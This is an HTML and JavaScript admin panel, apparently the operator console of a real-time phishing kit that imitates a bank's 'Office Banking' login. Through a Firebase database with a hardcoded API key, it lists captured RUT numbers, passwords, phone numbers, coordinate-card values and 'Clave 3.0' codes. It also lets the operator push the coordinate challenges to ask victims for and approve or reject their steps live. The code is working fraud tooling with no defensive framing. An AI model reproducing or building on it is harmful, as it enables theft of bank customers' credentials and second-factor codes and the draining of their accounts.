
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Panel Admin - Office Banking</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 2rem;
      background: #f5f5f5;
      color: #333;
    }
    h1 {
      text-align: center;
      margin-bottom: 2rem;
    }
    .section {
      margin-bottom: 2rem;
    }
    label {
      display: block;
      margin-bottom: 0.5rem;
    }
    input[type="text"] {
      width: 80px;
      padding: 5px;
      margin-right: 1rem;
      text-align: center;
    }
    button {
      padding: 0.5rem 1rem;
      background: #dc3545;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      margin: 0.25rem 0.5rem 0.25rem 0;
    }
    button:hover {
      background: #a7282f;
    }
    .switch {
      display: flex;
      align-items: center;
    }
    .switch input {
      margin-left: 1rem;
      transform: scale(1.5);
    }
    table {
      width: 100%;
      border-collapse: collapse;
      background: white;
    }
    th, td {
      padding: 8px;
      border: 1px solid #ccc;
      text-align: center;
      font-size: 14px;
    }
    th {
      background-color: #dc3545;
      color: white;
    }
  </style>
</head>
<body>
  <h1>Panel de Control - Office Banking</h1>

  <div class="section switch">
    <label for="modoAsistente">Modo Asistente</label>
    <input type="checkbox" id="modoAsistente" />
  </div>

  <div class="section">
    <label>Coordenadas en vivo</label>
    <input type="text" id="coord1" maxlength="2" />
    <input type="text" id="coord2" maxlength="2" />
    <input type="text" id="coord3" maxlength="2" />
    <button onclick="guardarCoordenadas()">Guardar</button>
  </div>

  <div class="section">
    <label>Validar paso luego de teléfono (pantalla cargando)</label>
    <button onclick="marcarValidacion('correcto')">✅ Siguiente</button>
    <button onclick="marcarValidacion('incorrecto')">❌ Error</button>
  </div>

  <div class="section">
    <label>Historial de registros</label>
    <table id="tabla">
      <thead>
        <tr>
          <th>Fecha y hora</th>
          <th>RUT</th>
          <th>Contraseña</th>
          <th>Teléfono</th>
          <th>Coordenadas</th>
          <th>Clave 3.0</th>
        </tr>
      </thead>
      <tbody id="tbody">
      </tbody>
    </table>
  </div>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
      authDomain: "formulario-officebanking.firebaseapp.com",
      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
      projectId: "formulario-officebanking"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const modoAsistente = document.getElementById("modoAsistente");
    modoAsistente.addEventListener("change", () => {
      db.ref("asistente").set(modoAsistente.checked);
    });

    db.ref("asistente").on("value", (snap) => {
      modoAsistente.checked = snap.val() === true;
    });

    function guardarCoordenadas() {
      const coord1 = document.getElementById("coord1").value;
      const coord2 = document.getElementById("coord2").value;
      const coord3 = document.getElementById("coord3").value;
      db.ref("coordenadas").set([coord1, coord2, coord3]);
    }

    function marcarValidacion(valor) {
      db.ref("validacion").set(valor);
    }

    const tbody = document.getElementById("tbody");
    db.ref("registros").limitToLast(50).on("child_added", (snap) => {
      const data = snap.val();
      const tr = document.createElement("tr");
      const fecha = new Date(data.timestamp).toLocaleString();
      tr.innerHTML = `
        <td>${fecha}</td>
        <td>${data.rut || ''}</td>
        <td>${data.clave || ''}</td>
        <td>${data.telefono || ''}</td>
        <td>${data.coordenadas || ''}</td>
        <td>${data.clave3 || ''}</td>
      `;
      tbody.prepend(tr);
    });
  </script>
</body>
</html>
